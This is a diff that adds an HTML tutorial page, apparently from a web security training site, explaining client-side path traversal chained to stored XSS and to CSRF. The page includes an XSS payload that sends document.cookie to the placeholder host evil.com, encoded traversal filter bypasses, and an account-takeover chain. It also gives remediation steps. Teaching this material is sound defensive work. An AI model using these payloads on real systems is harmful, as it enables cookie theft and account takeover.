@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Client-Side Path Traversal to XSS - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/labs/cspt/level3.html" class="try-lab">Try the Lab &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev high">High</span>
+      <span class="writeup-category">CSPT &middot; XSS &middot; CSRF &middot; Chain</span>
+    </div>
+
+    <h1>Client-Side Path Traversal to Stored XSS</h1>
+    <div class="writeup-author">Inspired by <strong>matanber</strong>'s CSPT research (OWASP AppSec 2024) &middot; Emerging attack class</div>
+
+    <div class="callout callout-vuln">
+      <h4>Vulnerability</h4>
+      <p>Client-side JavaScript uses user input to construct a <code>fetch()</code> URL path. By injecting path traversal sequences (<code>../</code>), an attacker can redirect the fetch request to a different API endpoint. When the response is rendered as HTML, the attacker controls what the victim sees &mdash; and what code executes.</p>
+    </div>
+
+    <h2>What is CSPT?</h2>
+    <p>Client-Side Path Traversal (CSPT) is the client-side equivalent of server-side path traversal. Instead of traversing the filesystem, you're traversing the API URL path constructed by JavaScript:</p>
+
+    <pre><code>// Application code - loads user notifications
+function loadNotifications(userId) {
+  fetch('/api/notifications/' + userId)
+    .then(r => r.json())
+    .then(data => {
+      document.getElementById('notifs').innerHTML = data.html;
+    });
+}
+
+// Normal use:
+loadNotifications('user123');
+// Fetches: /api/notifications/user123
+
+// CSPT attack - userId from URL parameter:
+// ?userId=../settings/admin
+loadNotifications('../settings/admin');
+// Fetches: /api/notifications/../settings/admin
+// Resolves to: /api/settings/admin
+// Attacker reads admin settings!</code></pre>
+
+    <h2>The Three CSPT Attack Patterns</h2>
+
+    <h3>Pattern 1: CSPT to Data Theft (IDOR)</h3>
+    <p>Traverse to read other users' data from different API endpoints:</p>
+
+    <pre><code>// App fetches: /api/users/{userId}/profile
+// Attack: userId = ../admin/profile
+// Fetches: /api/users/../admin/profile → /api/admin/profile
+
+// Or access other users:
+// userId = ../../users/victim123/profile
+// Fetches: /api/users/../../users/victim123/profile
+//        → /api/users/victim123/profile</code></pre>
+
+    <h3>Pattern 2: CSPT to XSS via Response Injection</h3>
+    <p>This is the most powerful pattern. If the application has a file upload endpoint, the attacker uploads a malicious JSON response, then traverses the fetch path to load their uploaded file instead of the legitimate API response:</p>
+
+    <pre><code>// Step 1: Upload malicious "response" via file upload API
+fetch('/api/upload', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    content: JSON.stringify({
+      html: '&lt;img src=x onerror="fetch(\\'https://evil.com/steal?c=\\'+document.cookie)"&gt;',
+      status: 'success'
+    }),
+    contentType: 'application/json'
+  })
+});
+// Returns: { fileId: "abc123", url: "/api/files/abc123" }
+
+// Step 2: Craft URL that traverses to the uploaded file
+// Normal: /api/notifications/{userId}
+// Attack: /api/notifications/../../api/files/abc123
+//       → /api/files/abc123 (attacker's malicious JSON!)
+
+// Step 3: The app renders the response HTML
+// document.getElementById('notifs').innerHTML = data.html;
+// → XSS fires! Attacker's onerror handler executes</code></pre>
+
+    <h3>Pattern 3: CSPT to CSRF (CSPT2CSRF)</h3>
+    <p>The most devastating chain. If the app loads settings from an API and auto-submits based on the response, CSPT lets the attacker control the "settings" response and trigger arbitrary actions:</p>
+
+    <pre><code>// App code: loads settings and auto-applies them
+async function loadSettings(section) {
+  const resp = await fetch('/api/settings/' + section);
+  const config = await resp.json();
+
+  // Auto-applies settings from the response
+  if (config.email) {
+    await fetch('/api/user/change-email', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      credentials: 'include',
+      body: JSON.stringify({ email: config.email })
+    });
+  }
+}
+
+// Normal: loadSettings('notifications')
+// → Fetches /api/settings/notifications
+// → Returns { notifications: true, theme: 'dark' }
+
+// CSPT2CSRF attack:
+// Step 1: Upload fake settings JSON
+// { "email": "attacker@evil.com" }
+// Stored at: /api/files/xyz789
+
+// Step 2: Craft URL: ?section=../../api/files/xyz789
+// → Fetches /api/settings/../../api/files/xyz789
+// → Returns the attacker's JSON with email field
+// → App auto-changes victim's email to attacker@evil.com!
+
+// Step 3: Attacker resets password → Full ATO</code></pre>
+
+    <div class="callout callout-chain">
+      <h4>The CSPT2CSRF Chain</h4>
+      <p><strong>Step 1:</strong> Upload a malicious JSON file with the desired CSRF action data</p>
+      <p><strong>Step 2:</strong> Send victim a URL with path traversal pointing to the uploaded file</p>
+      <p><strong>Step 3:</strong> App fetches attacker's JSON instead of real settings</p>
+      <p><strong>Step 4:</strong> App auto-submits a state-changing request using attacker's data</p>
+      <p><strong>Result:</strong> CSRF without needing to bypass CSRF tokens &mdash; the legitimate app makes the request!</p>
+    </div>
+
+    <h2>Filter Bypass Techniques</h2>
+    <p>When the app tries to block path traversal:</p>
+
+    <pre><code>// Filter: strips forward slashes
+userId = userId.replace(/\//g, '');
+// Bypass: use backslashes (equivalent in URLs)
+// ?userId=..\..\api\files\abc123
+
+// Filter: strips "../"
+userId = userId.replace(/\.\.\//g, '');
+// Bypass: double encoding
+// ?userId=..%252f..%252fapi%252ffiles%252fabc123
+
+// Filter: blocks ".." anywhere
+userId = userId.replace(/\.\./g, '');
+// Bypass: URL normalization
+// ?userId=.%2e/.%2e/api/files/abc123
+// After URL decoding: ../../api/files/abc123
+
+// Filter: checks for "api" in path
+// Bypass: case variation or encoding
+// ?userId=..%2f..%2fAPI%2ffiles%2fabc123</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why It Matters</h4>
+      <p>CSPT is an emerging attack class that most developers don't know about. It bypasses traditional CSRF protections because the legitimate application makes the state-changing request &mdash; with valid CSRF tokens, cookies, and headers. The attacker only controls the <strong>data</strong> the app acts on, not the request itself. This makes CSPT2CSRF particularly dangerous on applications with strong CSRF defenses.</p>
+    </div>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>To find CSPT: (1) Search JS for <code>fetch(</code> and <code>XMLHttpRequest</code> where the URL contains user input. (2) Look for URL params, hash fragments, or postMessage data used in API paths. (3) Test with <code>../</code> to see if you can reach different endpoints. (4) Check if the app has a file upload endpoint that returns a URL &mdash; that's your response injection target. (5) Look at what the app does with the API response &mdash; innerHTML? Auto-submit? Cookie setting? The sink determines the impact.</p>
+    </div>
+
+    <h2>Remediation</h2>
+    <ul>
+      <li>Validate user input used in fetch URLs &mdash; reject or strip <code>..</code>, <code>/</code>, <code>\</code>, and encoded variants</li>
+      <li>Use allowlists for path segments instead of blocklists</li>
+      <li>Validate API responses before acting on them (check expected schema)</li>
+      <li>Don't auto-submit forms or change settings based on API response data</li>
+      <li>Use <code>URL()</code> constructor to normalize paths and detect traversal</li>
+    </ul>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice This Vulnerability</h4>
+        <p>Lab: CSPT Response Injection &mdash; upload a malicious JSON, traverse the fetch path, achieve XSS through response injection.</p>
+      </div>
+      <a href="/labs/cspt/level3.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Advanced: CSPT2CSRF</h4>
+        <p>Lab: CSPT to CSRF &mdash; traverse the settings fetch path to your uploaded JSON, auto-change the victim's email. Full ATO.</p>
+      </div>
+      <a href="/labs/cspt/level4.html" class="lab-link-btn">Open Lab &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/postmessage-pii-exfiltration">&larr; PostMessage PII Exfiltration</a>
+      <a href="/writeups/mega-chain-ato">The Grand Chain ATO &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
